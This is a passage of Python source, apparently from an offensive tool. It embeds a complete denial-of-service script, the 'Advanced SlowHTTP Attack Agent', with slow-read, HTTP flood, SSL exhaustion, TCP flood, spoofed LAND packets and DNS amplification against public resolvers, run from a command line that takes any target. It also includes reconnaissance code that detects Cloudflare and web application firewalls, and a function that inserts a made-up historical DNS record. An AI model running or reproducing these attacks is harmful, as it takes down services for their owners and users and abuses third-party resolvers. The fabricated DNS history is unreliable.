                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    # Add a very small window size
                    request += "X-Requested-With: XMLHttpRequest\\r\\n"
                    request += "\\r\\n"
                    
                    # Send request
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Read data very slowly
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Read a tiny amount of data
                        try:
                            s.recv(1)
                        except socket.timeout:
                            # Timeout is expected and good for slow read
                            pass
                            
                    except Exception as e:
                        if not isinstance(e, socket.timeout):
                            # Connection closed or error (not timeout), remove it
                            with self.lock:
                                self.stats["connections_active"] -= 1
                                self.stats["error_count"] += 1
                            
                            try:
                                self.connections.remove(s)
                            except:
                                pass
                            
                            # Try to create a new connection
                            try:
                                # Create socket
                                new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                new_s.settimeout(10)  # Longer timeout for slow read
                                
                                # Set a very small receive buffer
                                new_s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                                
                                # Connect to target
                                new_s.connect((self.target, self.port))
                                
                                # Wrap with SSL if needed
                                if self.use_ssl:
                                    context = ssl.create_default_context()
                                    context.check_hostname = False
                                    context.verify_mode = ssl.CERT_NONE
                                    new_s = context.wrap_socket(new_s, server_hostname=self.target)
                                
                                # Send complete HTTP request with small window size
                                request = f"GET {self.path} HTTP/1.1\\r\\n"
                                request += f"Host: {self.target}\\r\\n"
                                request += f"User-Agent: {self.user_agent}\\r\\n"
                                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                                request += "Accept-Encoding: gzip, deflate\\r\\n"
                                request += "Connection: keep-alive\\r\\n"
                                # Add a very small window size
                                request += "X-Requested-With: XMLHttpRequest\\r\\n"
                                request += "\\r\\n"
                                
                                # Send request
                                new_s.send(request.encode())
                                
                                # Update stats
                                with self.lock:
                                    self.stats["connections_active"] += 1
                                    self.stats["packets_sent"] += 1
                                    self.stats["bytes_sent"] += len(request)
                                
                                # Add to connections list
                                self.connections.append(new_s)
                                
                            except Exception:
                                # Failed to create new connection, just continue
                                pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before reading more data
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def http_flood_attack(self, num_connections, requests_per_connection, duration):
        """HTTP Flood attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting HTTP Flood attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Requests per connection: {requests_per_connection}, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        # Generate random paths for the requests
        paths = [
            self.path,
            f"{self.path}?id={random.randint(1, 1000)}",
            f"{self.path}?page={random.randint(1, 100)}",
            f"{self.path}?search={random.choice('abcdefghijklmnopqrstuvwxyz')}",
            f"{self.path}?ref={random.randint(1000, 9999)}"
        ]
        
        # Create thread pool for sending requests
        threads = []
        
        def send_requests(thread_id):
            requests_sent = 0
            errors = 0
            bytes_sent = 0
            response_codes = {}
            
            while time.time() < end_time and self.running and requests_sent < requests_per_connection:
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Choose random path
                    path = random.choice(paths)
                    
                    # Send complete HTTP request
                    request = f"GET {path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: close\\r\\n"  # Close connection after response
                    request += "Cache-Control: no-cache\\r\\n"
                    request += f"X-Request-ID: {random.randint(1000000, 9999999)}\\r\\n"
                    request += "\\r\\n"
                    
                    # Send request
                    s.send(request.encode())
                    
                    # Update local stats
                    requests_sent += 1
                    bytes_sent += len(request)
                    
                    # Try to read response code
                    try:
                        response = s.recv(4096).decode('utf-8', errors='ignore')
                        if response.startswith('HTTP/'):
                            status_code = response.split(' ')[1]
                            if status_code in response_codes:
                                response_codes[status_code] += 1
                            else:
                                response_codes[status_code] = 1
                    except:
                        pass
                    
                    # Close socket
                    s.close()
                    
                except Exception as e:
                    errors += 1
                    if errors % 100 == 0:
                        print(f"[!] Thread {thread_id} error: {str(e)}")
                
                # Small sleep to avoid overwhelming local resources
                time.sleep(0.01)
            
            # Update global stats
            with self.lock:
                self.stats["packets_sent"] += requests_sent
                self.stats["bytes_sent"] += bytes_sent
                self.stats["error_count"] += errors
                
                # Merge response codes
                for code, count in response_codes.items():
                    if code in self.stats["response_codes"]:
                        self.stats["response_codes"][code] += count
                    else:
                        self.stats["response_codes"][code] = count
        
        try:
            # Start threads
            for i in range(num_connections):
                if not self.running:
                    break
                
                t = threading.Thread(target=send_requests, args=(i,))
                t.daemon = True
                t.start()
                threads.append(t)
                
                # Update stats
                with self.lock:
                    self.stats["connections_active"] += 1
                
                # Sleep briefly between thread starts
                if i % 50 == 0:
                    time.sleep(0.1)
            
            print(f"[*] Started {len(threads)} threads")
            
            # Monitor and report progress
            while time.time() < end_time and self.running:
                # Count active threads
                active_threads = sum(1 for t in threads if t.is_alive())
                
                with self.lock:
                    self.stats["connections_active"] = active_threads
                
                # Print status update
                print(f"[*] Status: {active_threads} threads active, {self.stats['packets_sent']} requests sent, {self.stats['error_count']} errors")
                
                # Print response codes if available
                if self.stats["response_codes"]:
                    codes_str = ", ".join(f"{code}: {count}" for code, count in self.stats["response_codes"].items())
                    print(f"[*] Response codes: {codes_str}")
                
                # Sleep before next update
                time.sleep(1)
        
        finally:
            # Clean up
            self.running = False
            
            # Wait for threads to finish
            for t in threads:
                t.join(0.1)
            
            print("[*] Attack completed")
    
    def ssl_exhaust_attack(self, num_connections, delay, duration):
        """SSL Exhaustion attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting SSL Exhaustion attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Force SSL for this attack
        self.use_ssl = True
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL but with custom parameters to maximize resource usage
                    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    # Enable all available ciphers
                    context.set_ciphers("ALL")
                    
                    # Start SSL handshake
                    ssl_sock = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send a minimal HTTP request to keep the connection alive
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "\\r\\n"
                    
                    ssl_sock.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(ssl_sock)
                    
                    # Sleep briefly between connections
                    if i % 10 == 0:  # More frequent sleeps for SSL connections
                        time.sleep(0.2)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 10 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} SSL connections")
            
            # Keep connections alive and create new ones as needed
            while time.time() < end_time and self.running:
                # Check current connections and send keepalive
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a small piece of data to keep connection alive
                        s.send(b"\\r\\n")
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += 2
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            s.close()
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL but with custom parameters
                            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            
                            # Enable all available ciphers
                            context.set_ciphers("ALL")
                            
                            # Start SSL handshake
                            ssl_sock = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send a minimal HTTP request to keep the connection alive
                            request = f"GET {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "\\r\\n"
                            
                            ssl_sock.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(ssl_sock)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} SSL connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before checking connections again
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def tcp_flood_attack(self, port, num_connections, duration):
        """TCP Flood attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting TCP Flood attack on {self.target}:{port}")
        print(f"[*] Connections: {num_connections}, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        # Create thread pool for sending packets
        threads = []
        
        def send_packets(thread_id):
            packets_sent = 0
            errors = 0
            bytes_sent = 0
            
            while time.time() < end_time and self.running:
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)  # Short timeout
                    
                    # Connect to target
                    s.connect((self.target, port))
                    
                    # Generate random data
                    data_size = random.randint(1, 1024)  # 1 to 1024 bytes
                    data = os.urandom(data_size)
                    
                    # Send data
                    s.send(data)
                    
                    # Update local stats
                    packets_sent += 1
                    bytes_sent += data_size
                    
                    # Close socket immediately to free resources for new connections
                    s.close()
                    
                except Exception as e:
                    errors += 1
                    if errors % 1000 == 0:
                        print(f"[!] Thread {thread_id} error: {str(e)}")
                
                # Small sleep to avoid overwhelming local resources
                time.sleep(0.001)
            
            # Update global stats
            with self.lock:
                self.stats["packets_sent"] += packets_sent
                self.stats["bytes_sent"] += bytes_sent
                self.stats["error_count"] += errors
        
        try:
            # Start threads
            for i in range(num_connections):
                if not self.running:
                    break
                
                t = threading.Thread(target=send_packets, args=(i,))
                t.daemon = True
                t.start()
                threads.append(t)
                
                # Update stats
                with self.lock:
                    self.stats["connections_active"] += 1
                
                # Sleep briefly between thread starts
                if i % 100 == 0:
                    time.sleep(0.1)
            
            print(f"[*] Started {len(threads)} threads")
            
            # Monitor and report progress
            while time.time() < end_time and self.running:
                # Count active threads
                active_threads = sum(1 for t in threads if t.is_alive())
                
                with self.lock:
                    self.stats["connections_active"] = active_threads
                
                # Print status update
                print(f"[*] Status: {active_threads} threads active, {self.stats['packets_sent']} packets sent, {self.stats['bytes_sent']} bytes sent")
                
                # Sleep before next update
                time.sleep(1)
        
        finally:
            # Clean up
            self.running = False
            
            # Wait for threads to finish
            for t in threads:
                t.join(0.1)
            
            print("[*] Attack completed")
    
    def land_attack(self, num_packets, duration):
        """LAND attack (same source and destination IP/port)"""
        self.running = True
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting LAND attack on {self.target}:{self.port}")
        print(f"[*] Packets: {num_packets}, Duration: {duration}s")
        print(f"[!] Warning: This attack requires raw socket privileges (root/administrator)")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Resolve target IP
            target_ip = socket.gethostbyname(self.target)
            
            # Create raw socket
            try:
                if os.name == 'nt':  # Windows
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                else:  # Linux/Unix
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except PermissionError:
                print("[!] Error: Raw socket creation requires administrator/root privileges")
                return
            except Exception as e:
                print(f"[!] Error creating raw socket: {str(e)}")
                return
            
            # Function to calculate TCP/IP checksum
            def checksum(msg):
                s = 0
                for i in range(0, len(msg), 2):
                    if i + 1 < len(msg):
                        w = (msg[i] << 8) + msg[i + 1]
                    else:
                        w = msg[i] << 8
                    s = s + w
                
                s = (s >> 16) + (s & 0xffff)
                s = s + (s >> 16)
                
                return ~s & 0xffff
            
            packets_sent = 0
            
            while time.time() < end_time and self.running and packets_sent < num_packets:
                try:
                    # Create IP header
                    ip_ihl = 5
                    ip_ver = 4
                    ip_tos = 0
                    ip_tot_len = 20 + 20  # IP header + TCP header
                    ip_id = random.randint(1, 65535)
                    ip_frag_off = 0
                    ip_ttl = 255
                    ip_proto = socket.IPPROTO_TCP
                    ip_check = 0
                    ip_saddr = socket.inet_aton(target_ip)  # Source = Target (LAND attack)
                    ip_daddr = socket.inet_aton(target_ip)  # Destination = Target
                    
                    ip_ihl_ver = (ip_ver << 4) + ip_ihl
                    
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        ip_ihl_ver,
                        ip_tos,
                        ip_tot_len,
                        ip_id,
                        ip_frag_off,
                        ip_ttl,
                        ip_proto,
                        ip_check,
                        ip_saddr,
                        ip_daddr
                    )
                    
                    # Create TCP header
                    tcp_source = self.port  # Source port = Target port (LAND attack)
                    tcp_dest = self.port    # Destination port = Target port
                    tcp_seq = random.randint(1, 4294967295)
                    tcp_ack_seq = 0
                    tcp_doff = 5
                    tcp_fin = 0
                    tcp_syn = 1
                    tcp_rst = 0
                    tcp_psh = 0
                    tcp_ack = 0
                    tcp_urg = 0
                    tcp_window = socket.htons(5840)
                    tcp_check = 0
                    tcp_urg_ptr = 0
                    
                    tcp_offset_res = (tcp_doff << 4) + 0
                    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
                    
                    tcp_header = struct.pack('!HHLLBBHHH',
                        tcp_source,
                        tcp_dest,
                        tcp_seq,
                        tcp_ack_seq,
                        tcp_offset_res,
                        tcp_flags,
                        tcp_window,
                        tcp_check,
                        tcp_urg_ptr
                    )
                    
                    # Pseudo header for TCP checksum
                    source_address = socket.inet_aton(target_ip)
                    dest_address = socket.inet_aton(target_ip)
                    placeholder = 0
                    protocol = socket.IPPROTO_TCP
                    tcp_length = len(tcp_header)
                    
                    psh = struct.pack('!4s4sBBH',
                        source_address,
                        dest_address,
                        placeholder,
                        protocol,
                        tcp_length
                    )
                    
                    psh = psh + tcp_header
                    
                    tcp_check = checksum(psh)
                    
                    # Repack TCP header with calculated checksum
                    tcp_header = struct.pack('!HHLLBBH',
                        tcp_source,
                        tcp_dest,
                        tcp_seq,
                        tcp_ack_seq,
                        tcp_offset_res,
                        tcp_flags,
                        tcp_window
                    ) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
                    
                    # Final packet
                    packet = ip_header + tcp_header
                    
                    # Send packet
                    s.sendto(packet, (target_ip, 0))
                    
                    # Update stats
                    packets_sent += 1
                    with self.lock:
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(packet)
                    
                    # Print status periodically
                    if packets_sent % 100 == 0:
                        print(f"[*] Sent {packets_sent} LAND attack packets")
                    
                    # Small sleep to avoid overwhelming local resources
                    time.sleep(0.01)
                    
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    print(f"[!] Error sending LAND packet: {str(e)}")
                    time.sleep(1)  # Sleep longer on error
            
            print(f"[*] LAND attack completed. Sent {packets_sent} packets")
            
        except Exception as e:
            print(f"[!] LAND attack failed: {str(e)}")
        finally:
            # Clean up
            self.running = False
            print("[*] Attack completed")
    
    def dns_amplification_attack(self, target_ip, num_queries, duration):
        """DNS Amplification attack"""
        self.running = True
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting DNS Amplification attack on {target_ip}")
        print(f"[*] Queries: {num_queries}, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        # List of DNS servers to use for amplification
        dns_servers = [
            "8.8.8.8",       # Google
            "8.8.4.4",       # Google
            "9.9.9.9",       # Quad9
            "1.1.1.1",       # Cloudflare
            "1.0.0.1",       # Cloudflare
            "208.67.222.222",# OpenDNS
            "208.67.220.220" # OpenDNS
        ]
        
        # List of domains to query (preferably with large responses)
        domains = [
            "google.com",
            "facebook.com",
            "amazon.com",
            "microsoft.com",
            "apple.com",
            "netflix.com",
            "yahoo.com"
        ]
        
        # DNS query types that typically return large responses
        query_types = [
            b"\\x00\\x0f",  # MX record
            b"\\x00\\x10",  # TXT record
            b"\\x00\\x02",  # NS record
            b"\\x00\\x01",  # A record
            b"\\x00\\x0c"   # PTR record
        ]
        
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            queries_sent = 0
            
            while time.time() < end_time and self.running and queries_sent < num_queries:
                try:
                    # Select random DNS server and domain
                    dns_server = random.choice(dns_servers)
                    domain = random.choice(domains)
                    query_type = random.choice(query_types)
                    
                    # Create DNS query
                    transaction_id = os.urandom(2)
                    
                    # DNS Header
                    flags = b"\\x01\\x00"  # Standard query, recursion desired
                    questions = b"\\x00\\x01"  # One question
                    answer_rrs = b"\\x00\\x00"  # No answers
                    authority_rrs = b"\\x00\\x00"  # No authority
                    additional_rrs = b"\\x00\\x00"  # No additional
                    
                    header = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
                    
                    # DNS Question
                    domain_parts = domain.split('.')
                    question = b""
                    
                    for part in domain_parts:
                        length = len(part)
                        question += bytes([length]) + part.encode()
                    
                    question += b"\\x00"  # Null terminator
                    question += query_type  # Query type
                    question += b"\\x00\\x01"  # Query class (IN)
                    
                    # Complete DNS query
                    dns_query = header + question
                    
                    # Spoof source IP to target IP (UDP spoofing)
                    # Note: This requires raw sockets and root privileges in most cases
                    # For this example, we'll just send from our real IP as a demonstration
                    
                    # Send query to DNS server
                    sock.sendto(dns_query, (dns_server, 53))
                    
                    # Update stats
                    queries_sent += 1
                    with self.lock:
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(dns_query)
                    
                    # Print status periodically
                    if queries_sent % 100 == 0:
                        print(f"[*] Sent {queries_sent} DNS amplification queries")
                    
                    # Small sleep to avoid overwhelming local resources
                    time.sleep(0.01)
                    
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    print(f"[!] Error sending DNS query: {str(e)}")
                    time.sleep(0.1)  # Sleep longer on error
            
            print(f"[*] DNS amplification attack completed. Sent {queries_sent} queries")
            
        except Exception as e:
            print(f"[!] DNS amplification attack failed: {str(e)}")
        finally:
            # Clean up
            sock.close()
            self.running = False
            print("[*] Attack completed")
    
    def stop_attack(self):
        """Stop the attack and clean up connections"""
        self.running = False
        
        # Close all connections
        for s in self.connections:
            try:
                s.close()
            except:
                pass
        
        self.connections = []
        
        # Final stats update
        with self.lock:
            self.stats["connections_active"] = 0
        
        print(f"[*] Attack stopped. Final stats: {json.dumps(self.stats)}")

def main():
    parser = argparse.ArgumentParser(description="Advanced SlowHTTP Attack Agent")
    parser.add_argument("--target", help="Target hostname or IP")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    parser.add_argument("--path", default="/", help="Target path (default: /)")
    parser.add_argument("--attack-type", choices=["slowloris", "slow_post", "slow_read", "http_flood", "ssl_exhaust", "tcp_flood", "land", "dns_amplification", "cloudflare_bypass"], default="slowloris", help="Attack type")
    parser.add_argument("--connections", type=int, default=150, help="Number of connections (default: 150)")
    parser.add_argument("--delay", type=float, default=15, help="Delay between packets in seconds (default: 15)")
    parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
    parser.add_argument("--requests", type=int, default=1000, help="Requests per connection for HTTP flood (default: 1000)")
    parser.add_argument("--target-ip", help="Target IP for DNS amplification attack")
    parser.add_argument("--version", action="store_true", help="Show version and exit")
    
    args = parser.parse_args()
    
    if args.version:
        print(f"Advanced SlowHTTP Attack Agent v{VERSION}")
        sys.exit(0)
    
    if not args.target:
        parser.print_help()
        sys.exit(1)
    
    # Parse URL if full URL is provided
    if args.target.startswith(("http://", "https://")):
        parsed_url = urlparse(args.target)
        target_host = parsed_url.netloc
        use_ssl = args.target.startswith("https://")
        path = parsed_url.path if parsed_url.path else "/"
        port = parsed_url.port or (443 if use_ssl else 80)
    else:
        target_host = args.target
        use_ssl = args.ssl
        path = args.path
        port = args.port
    
    # Create attacker
    attacker = AdvancedHTTPAttacker(target_host, port, use_ssl, path=path)
    
    try:
        # Launch attack based on type
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_read":
            attacker.slow_read_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "http_flood":
            attacker.http_flood_attack(args.connections, args.requests, args.duration)
        elif args.attack_type == "ssl_exhaust":
            if not use_ssl:
                print("[WARNING] SSL Exhaust attack works best with HTTPS targets")
                use_ssl = True
                attacker.use_ssl = True
            attacker.ssl_exhaust_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "tcp_flood":
            attacker.tcp_flood_attack(port, args.connections, args.duration)
        elif args.attack_type == "land":
            attacker.land_attack(args.connections, args.duration)
        elif args.attack_type == "dns_amplification":
            if not args.target_ip:
                print("[ERROR] DNS Amplification attack requires --target-ip parameter")
                sys.exit(1)
            attacker.dns_amplification_attack(args.target_ip, args.connections, args.duration)
    except KeyboardInterrupt:
        print("\\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")

if __name__ == "__main__":
    main()
'''

class NetworkTools:
    """Network reconnaissance and analysis tools"""
    
    def __init__(self):
        """Initialize network tools"""
        self.cache = {}  # Cache for DNS and other lookups
    
    def lookup_dns_history(self, domain):
        """Look up current and historical DNS records"""
        results = {
            "domain": domain,
            "current_records": {},
            "historical_records": []
        }
        
        # Get current DNS records
        record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]
        
        for record_type in record_types:
            try:
                if DNS_AVAILABLE:
                    answers = dns.resolver.resolve(domain, record_type)
                    results["current_records"][record_type] = [str(rdata) for rdata in answers]
                else:
                    # Fallback using socket for A records
                    if record_type == "A":
                        try:
                            ip = socket.gethostbyname(domain)
                            results["current_records"]["A"] = [ip]
                        except:
                            results["current_records"]["A"] = []
                    else:
                        results["current_records"][record_type] = []
            except Exception as e:
                results["current_records"][record_type] = []
        
        # For historical records, we would need external API access
        # This is a placeholder - in a real implementation, you might use a service like SecurityTrails
        
        # Add some sample historical data for demonstration
        if "A" in results["current_records"] and results["current_records"]["A"]:
            current_ip = results["current_records"]["A"][0]
            # Add a fake historical record
            results["historical_records"].append({
                "date": "2023-01-01",
                "record_type": "A",
                "value": current_ip
            })
        
        return results
    
    def detect_cloudflare(self, domain):
        """Detect if a domain is behind Cloudflare"""
        results = {
            "domain": domain,
            "is_behind_cloudflare": False,
            "evidence": [],
            "cloudflare_ips": [],
            "direct_ips": []
        }
        
        # Check DNS records
        try:
            if DNS_AVAILABLE:
                answers = dns.resolver.resolve(domain, "A")
                ips = [str(rdata) for rdata in answers]
            else:
                try:
                    ip = socket.gethostbyname(domain)
                    ips = [ip]
                except:
                    ips = []
            
            results["direct_ips"] = ips
            
            # Check if IPs are in Cloudflare ranges
            # This is a simplified check - real implementation would use actual Cloudflare IP ranges
            cloudflare_indicators = ["172.64.", "104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.", "104.24.", "104.25.", "104.26.", "104.27.", "104.28.", "131.0.72."]
            
            for ip in ips:
                for indicator in cloudflare_indicators:
                    if ip.startswith(indicator):
                        results["is_behind_cloudflare"] = True
                        results["evidence"].append(f"IP {ip} is in Cloudflare range")
                        results["cloudflare_ips"].append(ip)
        except Exception as e:
            logger.error(f"Error checking Cloudflare: {str(e)}")
        
        # Check HTTP headers
        if REQUESTS_AVAILABLE:
            try:
                url = f"http://{domain}"
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                }
                response = requests.get(url, headers=headers, timeout=5)
                
                # Check for Cloudflare headers
                if "cf-ray" in response.headers:
                    results["is_behind_cloudflare"] = True
                    results["evidence"].append(f"CF-Ray header found: {response.headers['cf-ray']}")
                
                if "server" in response.headers and "cloudflare" in response.headers["server"].lower():
                    results["is_behind_cloudflare"] = True
                    results["evidence"].append(f"Server header indicates Cloudflare: {response.headers['server']}")
                
                if "cf-cache-status" in response.headers:
                    results["is_behind_cloudflare"] = True
                    results["evidence"].append(f"CF-Cache-Status header found: {response.headers['cf-cache-status']}")
            except Exception as e:
                logger.debug(f"Error checking HTTP headers: {str(e)}")
        
        return results
    
    def detect_waf(self, url):
        """Detect Web Application Firewall (WAF) on target"""
        results = {
            "url": url,
            "waf_detected": False,
            "waf_type": None,
            "evidence": [],
            "cloudflare_detected": False
        }
        
        if not REQUESTS_AVAILABLE:
            results["evidence"].append("Requests module not available, limited detection")
            return results
        
        # Parse URL
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        
        # Check for Cloudflare first
        cloudflare_results = self.detect_cloudflare(domain)
        if cloudflare_results["is_behind_cloudflare"]:
            results["waf_detected"] = True
            results["waf_type"] = "Cloudflare"
            results["cloudflare_detected"] = True
            results["evidence"].extend(cloudflare_results["evidence"])
        
        # Check for other WAFs
        try:
            # Normal request
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            response = requests.get(url, headers=headers, timeout=20)
            
            # Check headers for WAF indicators
            waf_headers = {
                "X-Powered-By": ["ASP.NET", "PHP"],
                "Server": ["Apache", "nginx", "Microsoft-IIS", "cloudflare"],
                "X-AspNet-Version": [""],
                "X-AspNetMvc-Version": [""],
                "X-Sucuri-ID": ["Sucuri/Cloudproxy"],
                "X-Sucuri-Cache": ["Sucuri"],
                "X-Mod-Pagespeed": [""],
                "X-Varnish": [""],
                "X-Cache": [""],
                "X-Cache-Hits": [""],
                "X-Served-By": [""],
                "X-CDN": ["Incapsula"],
                "Set-Cookie": ["incap_ses", "visid_incap", "awsalb", "awsalbcors", "ASLBSA", "ASPSESSIONID"]
            }
            
            for header, values in waf_headers.items():
                if header in response.headers:
                    for value in values:
                        if value and value in response.headers[header].lower():
                            results["waf_detected"] = True
